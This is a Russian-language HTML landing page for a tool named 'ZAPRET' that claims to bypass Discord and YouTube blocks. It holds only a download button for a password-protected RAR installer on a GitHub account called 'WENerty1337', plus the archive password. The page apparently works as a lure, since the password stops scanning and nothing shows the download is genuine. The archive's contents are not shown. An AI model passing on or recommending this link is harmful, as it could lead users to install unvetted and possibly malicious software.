<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZAPRET - Обход блокировок Discord/YouTube</title>
    <style>
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .box {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid #22c55e;
            box-shadow: 0 0 30px rgba(34, 197, 94, 0.3);
        }
        h1 {
            color: #22c55e;
            font-size: 32px;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .subtitle {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 30px;
            letter-spacing: 3px;
            text-transform: uppercase;
        }
        .btn {
            background: #22c55e;
            color: #fff;
            padding: 15px 50px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-weight: bold;
            text-transform: uppercase;
            transition: 0.3s;
        }
        .btn:hover {
            background: #16a34a;
            transform: scale(1.05);
        }
        .pass-box {
            background: #0d0d0d;
            border: 1px dashed #22c55e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 25px;
        }
        .pass-label {
            color: #aaa;
            font-size: 13px;
            margin-bottom: 5px;
        }
        .pass {
            color: #ffd700;
            font-size: 20px;
            font-weight: bold;
            letter-spacing: 3px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>ZAPRET</h1>
        <p class="subtitle">ОБХОД БЛОКИРОВОК DISCORD / YOUTUBE</p>
        
        <a href="https://raw.githubusercontent.com/WENerty1337/-FATALITY-/main/Zapret2Setup_20_0_4_0.rar" class="btn">⬇️ Скачать</a>
        
        <div class="pass-box">
            <div class="pass-label">🔑 Пароль от архива:</div>
            <div class="pass">zapret2</div>
        </div>
    </div>
</body>
</html>
